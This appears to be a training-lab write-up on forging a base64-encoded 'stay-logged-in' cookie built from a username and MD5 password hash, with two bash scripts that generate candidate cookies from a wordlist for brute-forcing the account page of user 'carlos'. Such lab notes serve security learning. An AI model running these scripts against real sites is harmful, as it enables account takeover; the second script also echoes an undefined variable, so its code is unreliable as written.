# Lab08: Brute-forcing a stay-logged-in cookie

## PRACTITIONER


### THEORY
A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever.




### METHOD

First sign in with the provided account and study the "stay-logged-in" cookie

Notice anything?

The cookie is a base 64 encoding of 
```
<USERNAME>:<MD5-PASSWORD-HASH>
```
use the bash script
```bash
#!/bin/bash

file="$1"

while IFS= read -r lne; do
  md5Hash=$(echo -n "$lne" | openssl dgst -md5 | cut -d " " -f2)
  togthr="carlos:$md5Hash"
  echo "$togthr"
done < "$file"
```
Along with the results of the above as argument, converting it to base64 with
```bash
#!/bin/env bash
file2=$1

while IFS= read -r lne; do
    echo -n "$line" | base64 >> enPasswd.txt
done < $file2
```
Once set, bruteforce the cookie to /my-account?id=<usrname>, replacing username with carlos.

Remove session, only bruteforce against stay-logged-in

